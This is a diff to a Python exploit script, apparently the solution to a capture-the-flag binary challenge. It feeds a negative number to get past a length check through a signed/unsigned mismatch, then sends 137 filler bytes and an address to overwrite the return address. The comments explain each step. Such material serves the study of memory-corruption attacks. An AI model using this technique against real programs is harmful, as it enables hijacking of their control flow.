@@ -45,9 +45,14 @@ if __name__ == '__main__':
     n = 0x401363
     n = n.to_bytes( ( n.bit_length() + 7 ) // 8, 'little' ) or b'\0'
 
-    # This overflows the stack, then overwrites the check that compares a variable against "0xdeadbeef"
+    # The first number bypasses the check for a maximum number of characters
+    #   since the a negative number generates a two's complement number which 
+    #   when it's interpreted as unsigned is larger than the checked number, but
+    #   is smaller than the checked number if it's signed.
     submit_input( proc, b'-190' )
     read_prompt( proc, prompt1_string, ':' )
+
+    # Do a standard buffer overflow, and overwrite the return address.
     submit_input( proc, b'a' * 137 + n )
     read_prompt( proc, prompt2_string, '!' )
 
